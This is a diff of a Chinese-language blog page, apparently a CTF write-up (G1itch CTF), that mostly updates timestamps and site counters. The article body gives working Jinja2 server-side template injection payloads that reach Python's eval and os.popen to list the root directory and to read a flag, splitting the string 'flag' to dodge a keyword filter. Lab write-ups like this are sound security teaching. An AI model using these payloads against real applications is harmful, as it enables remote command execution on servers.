@@ -93,7 +93,7 @@
 <meta property="og:image" content="https://image.3001.net/images/20210530/1622374776_60b37978dc3104735bc4d.png!small">
 <meta property="og:image" content="https://image.3001.net/images/20210530/1622376727_60b381170a65dc8580eb0.png!small">
 <meta property="article:published_time" content="2021-07-05T10:59:24.000Z">
-<meta property="article:modified_time" content="2021-08-21T03:33:35.473Z">
+<meta property="article:modified_time" content="2021-10-25T09:48:16.778Z">
 <meta property="article:author" content="teener666">
 <meta property="article:tag" content="G1itch CTF">
 <meta name="twitter:card" content="summary">
@@ -474,19 +474,15 @@
       
         <p>访问网址显示内容如下:</p>
 <p><img src="https://image.3001.net/images/20210821/1629516790_612073f655515b896a6a8.png!small" alt="img"></p>
-<p>输入49发现回显了49</p>
-<span id="more"></span>
-
+<p>输入49发现回显了49<span id="more"></span></p>
 <p><img src="https://image.3001.net/images/20210530/1622374776_60b37978dc3104735bc4d.png!small" alt="1622374776_60b37978dc3104735bc4d.png!small"></p>
 <p><strong>模板注入 。</strong></p>
 <p>模板注入解析:  <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7746">https://xz.aliyun.com/t/7746</a></p>
 <p>这里就不多解释了直接上payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;%if%20c.__name__==&#x27;catch_warnings&#x27;%27&#x27;%&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
 <p><img src="https://image.3001.net/images/20210530/1622376727_60b381170a65dc8580eb0.png!small" alt="1622376727_60b381170a65dc8580eb0.png!small"></p>
 <p>测试可知<strong>过滤flag</strong>,命令执行绕过得FLAG:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;%if%20c.__name__==&#x27;catch_warnings&#x27;%27&#x27;%&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /fla&#x27;&#x27;g&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
 
       
     </div>
@@ -619,7 +615,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-count">28</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -720,7 +716,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">21.7k</span>
+    <span title="Site words total count">22.4k</span>
   
 </div>
 
